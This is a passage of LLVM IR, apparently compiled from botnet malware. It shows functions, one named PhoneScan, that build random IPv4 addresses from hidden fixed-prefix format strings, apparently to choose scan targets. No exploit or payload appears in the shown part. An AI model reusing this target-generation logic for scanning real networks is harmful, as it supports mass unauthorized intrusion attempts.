  %1443 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1444 = zext i8 %1443 to i32
  %1445 = call i32 (i8*, i8*, ...) @szprintf(i8* %1440, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.176, i32 0, i32 0), i32 %1442, i32 %1444)
  br label %1446

; <label>:1446:                                   ; preds = %1439, %1436
  %1447 = load i32, i32* %1, align 4
  %1448 = icmp eq i32 %1447, 142
  br i1 %1448, label %1449, label %1456

; <label>:1449:                                   ; preds = %1446
  %1450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1452 = zext i8 %1451 to i32
  %1453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1454 = zext i8 %1453 to i32
  %1455 = call i32 (i8*, i8*, ...) @szprintf(i8* %1450, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.177, i32 0, i32 0), i32 %1452, i32 %1454)
  br label %1456

; <label>:1456:                                   ; preds = %1449, %1446
  %1457 = load i32, i32* %1, align 4
  %1458 = icmp eq i32 %1457, 143
  br i1 %1458, label %1459, label %1466

; <label>:1459:                                   ; preds = %1456
  %1460 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1462 = zext i8 %1461 to i32
  %1463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1464 = zext i8 %1463 to i32
  %1465 = call i32 (i8*, i8*, ...) @szprintf(i8* %1460, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.178, i32 0, i32 0), i32 %1462, i32 %1464)
  br label %1466

; <label>:1466:                                   ; preds = %1459, %1456
  %1467 = load i32, i32* %1, align 4
  %1468 = icmp eq i32 %1467, 144
  br i1 %1468, label %1469, label %1476

; <label>:1469:                                   ; preds = %1466
  %1470 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1471 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1472 = zext i8 %1471 to i32
  %1473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1474 = zext i8 %1473 to i32
  %1475 = call i32 (i8*, i8*, ...) @szprintf(i8* %1470, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.179, i32 0, i32 0), i32 %1472, i32 %1474)
  br label %1476

; <label>:1476:                                   ; preds = %1469, %1466
  %1477 = load i32, i32* %1, align 4
  %1478 = icmp eq i32 %1477, 145
  br i1 %1478, label %1479, label %1486

; <label>:1479:                                   ; preds = %1476
  %1480 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1482 = zext i8 %1481 to i32
  %1483 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1484 = zext i8 %1483 to i32
  %1485 = call i32 (i8*, i8*, ...) @szprintf(i8* %1480, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.180, i32 0, i32 0), i32 %1482, i32 %1484)
  br label %1486

; <label>:1486:                                   ; preds = %1479, %1476
  %1487 = load i32, i32* %1, align 4
  %1488 = icmp eq i32 %1487, 146
  br i1 %1488, label %1489, label %1496

; <label>:1489:                                   ; preds = %1486
  %1490 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1492 = zext i8 %1491 to i32
  %1493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1494 = zext i8 %1493 to i32
  %1495 = call i32 (i8*, i8*, ...) @szprintf(i8* %1490, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.181, i32 0, i32 0), i32 %1492, i32 %1494)
  br label %1496

; <label>:1496:                                   ; preds = %1489, %1486
  %1497 = load i32, i32* %1, align 4
  %1498 = icmp eq i32 %1497, 147
  br i1 %1498, label %1499, label %1506

; <label>:1499:                                   ; preds = %1496
  %1500 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1502 = zext i8 %1501 to i32
  %1503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1504 = zext i8 %1503 to i32
  %1505 = call i32 (i8*, i8*, ...) @szprintf(i8* %1500, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.182, i32 0, i32 0), i32 %1502, i32 %1504)
  br label %1506

; <label>:1506:                                   ; preds = %1499, %1496
  %1507 = load i32, i32* %1, align 4
  %1508 = icmp eq i32 %1507, 148
  br i1 %1508, label %1509, label %1516

; <label>:1509:                                   ; preds = %1506
  %1510 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1512 = zext i8 %1511 to i32
  %1513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1514 = zext i8 %1513 to i32
  %1515 = call i32 (i8*, i8*, ...) @szprintf(i8* %1510, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i32 %1512, i32 %1514)
  br label %1516

; <label>:1516:                                   ; preds = %1509, %1506
  %1517 = load i32, i32* %1, align 4
  %1518 = icmp eq i32 %1517, 149
  br i1 %1518, label %1519, label %1526

; <label>:1519:                                   ; preds = %1516
  %1520 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1522 = zext i8 %1521 to i32
  %1523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1524 = zext i8 %1523 to i32
  %1525 = call i32 (i8*, i8*, ...) @szprintf(i8* %1520, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.184, i32 0, i32 0), i32 %1522, i32 %1524)
  br label %1526

; <label>:1526:                                   ; preds = %1519, %1516
  %1527 = load i32, i32* %1, align 4
  %1528 = icmp eq i32 %1527, 150
  br i1 %1528, label %1529, label %1536

; <label>:1529:                                   ; preds = %1526
  %1530 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1531 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1532 = zext i8 %1531 to i32
  %1533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1534 = zext i8 %1533 to i32
  %1535 = call i32 (i8*, i8*, ...) @szprintf(i8* %1530, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i32 %1532, i32 %1534)
  br label %1536

; <label>:1536:                                   ; preds = %1529, %1526
  %1537 = load i32, i32* %1, align 4
  %1538 = icmp eq i32 %1537, 151
  br i1 %1538, label %1539, label %1546

; <label>:1539:                                   ; preds = %1536
  %1540 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1542 = zext i8 %1541 to i32
  %1543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1544 = zext i8 %1543 to i32
  %1545 = call i32 (i8*, i8*, ...) @szprintf(i8* %1540, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i32 %1542, i32 %1544)
  br label %1546

; <label>:1546:                                   ; preds = %1539, %1536
  %1547 = load i32, i32* %1, align 4
  %1548 = icmp eq i32 %1547, 152
  br i1 %1548, label %1549, label %1556

; <label>:1549:                                   ; preds = %1546
  %1550 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1554 = zext i8 %1553 to i32
  %1555 = call i32 (i8*, i8*, ...) @szprintf(i8* %1550, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.187, i32 0, i32 0), i32 %1552, i32 %1554)
  br label %1556

; <label>:1556:                                   ; preds = %1549, %1546
  %1557 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1558 = call i32 @inet_addr(i8* %1557) #5
  ret i32 %1558
}

; Function Attrs: noinline nounwind uwtable
define i32 @PhoneScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 117
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* %1, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i32 %32, i32 %34)
  br label %36

; <label>:36:                                     ; preds = %29, %26
  %37 = load i32, i32* %1, align 4
  %38 = icmp eq i32 %37, 2
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %42 = zext i8 %41 to i32
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %44 = zext i8 %43 to i32
  %45 = call i32 (i8*, i8*, ...) @szprintf(i8* %40, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.190, i32 0, i32 0), i32 %42, i32 %44)
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %1, align 4
  %48 = icmp eq i32 %47, 3
  br i1 %48, label %49, label %56

; <label>:49:                                     ; preds = %46
  %50 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %51 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %54 = zext i8 %53 to i32
  %55 = call i32 (i8*, i8*, ...) @szprintf(i8* %50, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.191, i32 0, i32 0), i32 %52, i32 %54)
  br label %56

; <label>:56:                                     ; preds = %49, %46
  %57 = load i32, i32* %1, align 4
  %58 = icmp eq i32 %57, 4
  br i1 %58, label %59, label %66

; <label>:59:                                     ; preds = %56
  %60 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %62 = zext i8 %61 to i32
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %64 = zext i8 %63 to i32
  %65 = call i32 (i8*, i8*, ...) @szprintf(i8* %60, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.192, i32 0, i32 0), i32 %62, i32 %64)
  br label %66

; <label>:66:                                     ; preds = %59, %56
  %67 = load i32, i32* %1, align 4
  %68 = icmp eq i32 %67, 5
  br i1 %68, label %69, label %76

; <label>:69:                                     ; preds = %66
  %70 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %71 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %72 = zext i8 %71 to i32
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %74 = zext i8 %73 to i32
  %75 = call i32 (i8*, i8*, ...) @szprintf(i8* %70, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.193, i32 0, i32 0), i32 %72, i32 %74)
  br label %76

; <label>:76:                                     ; preds = %69, %66
  %77 = load i32, i32* %1, align 4
  %78 = icmp eq i32 %77, 6
  br i1 %78, label %79, label %86

; <label>:79:                                     ; preds = %76
  %80 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %84 = zext i8 %83 to i32
  %85 = call i32 (i8*, i8*, ...) @szprintf(i8* %80, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.194, i32 0, i32 0), i32 %82, i32 %84)
  br label %86

; <label>:86:                                     ; preds = %79, %76
  %87 = load i32, i32* %1, align 4
  %88 = icmp eq i32 %87, 7
  br i1 %88, label %89, label %96

; <label>:89:                                     ; preds = %86
  %90 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %91 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %92 = zext i8 %91 to i32
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %94 = zext i8 %93 to i32
  %95 = call i32 (i8*, i8*, ...) @szprintf(i8* %90, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.195, i32 0, i32 0), i32 %92, i32 %94)
  br label %96

; <label>:96:                                     ; preds = %89, %86
  %97 = load i32, i32* %1, align 4
  %98 = icmp eq i32 %97, 8
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %96
  %100 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %102 = zext i8 %101 to i32
  %103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %104 = zext i8 %103 to i32
  %105 = call i32 (i8*, i8*, ...) @szprintf(i8* %100, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %102, i32 %104)
  br label %106

; <label>:106:                                    ; preds = %99, %96
  %107 = load i32, i32* %1, align 4
  %108 = icmp eq i32 %107, 9
  br i1 %108, label %109, label %116

; <label>:109:                                    ; preds = %106
  %110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %114 = zext i8 %113 to i32
  %115 = call i32 (i8*, i8*, ...) @szprintf(i8* %110, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0), i32 %112, i32 %114)
  br label %116

; <label>:116:                                    ; preds = %109, %106
  %117 = load i32, i32* %1, align 4
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %126

; <label>:119:                                    ; preds = %116
  %120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %124 = zext i8 %123 to i32
  %125 = call i32 (i8*, i8*, ...) @szprintf(i8* %120, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.197, i32 0, i32 0), i32 %122, i32 %124)
  br label %126

; <label>:126:                                    ; preds = %119, %116
  %127 = load i32, i32* %1, align 4
  %128 = icmp eq i32 %127, 11
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %126
  %130 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %132 = zext i8 %131 to i32
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %134 = zext i8 %133 to i32
  %135 = call i32 (i8*, i8*, ...) @szprintf(i8* %130, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i32 %132, i32 %134)
  br label %136

; <label>:136:                                    ; preds = %129, %126
  %137 = load i32, i32* %1, align 4
  %138 = icmp eq i32 %137, 12
  br i1 %138, label %139, label %146

; <label>:139:                                    ; preds = %136
  %140 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %142 = zext i8 %141 to i32
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %144 = zext i8 %143 to i32
  %145 = call i32 (i8*, i8*, ...) @szprintf(i8* %140, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.199, i32 0, i32 0), i32 %142, i32 %144)
  br label %146

; <label>:146:                                    ; preds = %139, %136
  %147 = load i32, i32* %1, align 4
  %148 = icmp eq i32 %147, 13
  br i1 %148, label %149, label %156

; <label>:149:                                    ; preds = %146
  %150 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %152 = zext i8 %151 to i32
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %154 = zext i8 %153 to i32
  %155 = call i32 (i8*, i8*, ...) @szprintf(i8* %150, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.200, i32 0, i32 0), i32 %152, i32 %154)
  br label %156

; <label>:156:                                    ; preds = %149, %146
  %157 = load i32, i32* %1, align 4
  %158 = icmp eq i32 %157, 14
  br i1 %158, label %159, label %166

; <label>:159:                                    ; preds = %156
  %160 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = zext i8 %161 to i32
  %163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %164 = zext i8 %163 to i32
  %165 = call i32 (i8*, i8*, ...) @szprintf(i8* %160, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %162, i32 %164)
  br label %166

; <label>:166:                                    ; preds = %159, %156
  %167 = load i32, i32* %1, align 4
  %168 = icmp eq i32 %167, 15
  br i1 %168, label %169, label %176

; <label>:169:                                    ; preds = %166
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %172 = zext i8 %171 to i32
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %174 = zext i8 %173 to i32
  %175 = call i32 (i8*, i8*, ...) @szprintf(i8* %170, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %172, i32 %174)
  br label %176

; <label>:176:                                    ; preds = %169, %166
  %177 = load i32, i32* %1, align 4
  %178 = icmp eq i32 %177, 16
  br i1 %178, label %179, label %186

; <label>:179:                                    ; preds = %176
  %180 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %182 = zext i8 %181 to i32
  %183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %184 = zext i8 %183 to i32
  %185 = call i32 (i8*, i8*, ...) @szprintf(i8* %180, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.203, i32 0, i32 0), i32 %182, i32 %184)
  br label %186

; <label>:186:                                    ; preds = %179, %176
  %187 = load i32, i32* %1, align 4
  %188 = icmp eq i32 %187, 17
  br i1 %188, label %189, label %196

; <label>:189:                                    ; preds = %186
  %190 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %192 = zext i8 %191 to i32
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %194 = zext i8 %193 to i32
  %195 = call i32 (i8*, i8*, ...) @szprintf(i8* %190, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.204, i32 0, i32 0), i32 %192, i32 %194)
  br label %196

; <label>:196:                                    ; preds = %189, %186
  %197 = load i32, i32* %1, align 4
  %198 = icmp eq i32 %197, 18
  br i1 %198, label %199, label %206

; <label>:199:                                    ; preds = %196
  %200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %204 = zext i8 %203 to i32
  %205 = call i32 (i8*, i8*, ...) @szprintf(i8* %200, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i32 %202, i32 %204)
  br label %206

; <label>:206:                                    ; preds = %199, %196
  %207 = load i32, i32* %1, align 4
  %208 = icmp eq i32 %207, 19
  br i1 %208, label %209, label %216

; <label>:209:                                    ; preds = %206
  %210 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %212 = zext i8 %211 to i32
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %214 = zext i8 %213 to i32
  %215 = call i32 (i8*, i8*, ...) @szprintf(i8* %210, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.206, i32 0, i32 0), i32 %212, i32 %214)
  br label %216

; <label>:216:                                    ; preds = %209, %206
  %217 = load i32, i32* %1, align 4
  %218 = icmp eq i32 %217, 20
  br i1 %218, label %219, label %226

; <label>:219:                                    ; preds = %216
  %220 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %222 = zext i8 %221 to i32
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %224 = zext i8 %223 to i32
  %225 = call i32 (i8*, i8*, ...) @szprintf(i8* %220, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.207, i32 0, i32 0), i32 %222, i32 %224)
  br label %226

; <label>:226:                                    ; preds = %219, %216
  %227 = load i32, i32* %1, align 4
  %228 = icmp eq i32 %227, 21
  br i1 %228, label %229, label %236

; <label>:229:                                    ; preds = %226
  %230 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %232 = zext i8 %231 to i32
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %234 = zext i8 %233 to i32
  %235 = call i32 (i8*, i8*, ...) @szprintf(i8* %230, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i32 %232, i32 %234)
  br label %236

; <label>:236:                                    ; preds = %229, %226
  %237 = load i32, i32* %1, align 4
  %238 = icmp eq i32 %237, 22
  br i1 %238, label %239, label %246

; <label>:239:                                    ; preds = %236
  %240 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %242 = zext i8 %241 to i32
  %243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %244 = zext i8 %243 to i32
  %245 = call i32 (i8*, i8*, ...) @szprintf(i8* %240, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.209, i32 0, i32 0), i32 %242, i32 %244)
  br label %246

; <label>:246:                                    ; preds = %239, %236
  %247 = load i32, i32* %1, align 4
  %248 = icmp eq i32 %247, 23
  br i1 %248, label %249, label %256

; <label>:249:                                    ; preds = %246
  %250 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %252 = zext i8 %251 to i32
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %254 = zext i8 %253 to i32
  %255 = call i32 (i8*, i8*, ...) @szprintf(i8* %250, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.210, i32 0, i32 0), i32 %252, i32 %254)
  br label %256

; <label>:256:                                    ; preds = %249, %246
  %257 = load i32, i32* %1, align 4
  %258 = icmp eq i32 %257, 24
  br i1 %258, label %259, label %266

; <label>:259:                                    ; preds = %256
  %260 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %262 = zext i8 %261 to i32
  %263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %264 = zext i8 %263 to i32
  %265 = call i32 (i8*, i8*, ...) @szprintf(i8* %260, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i32 %262, i32 %264)
  br label %266

; <label>:266:                                    ; preds = %259, %256
  %267 = load i32, i32* %1, align 4
  %268 = icmp eq i32 %267, 25
  br i1 %268, label %269, label %276

; <label>:269:                                    ; preds = %266
  %270 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
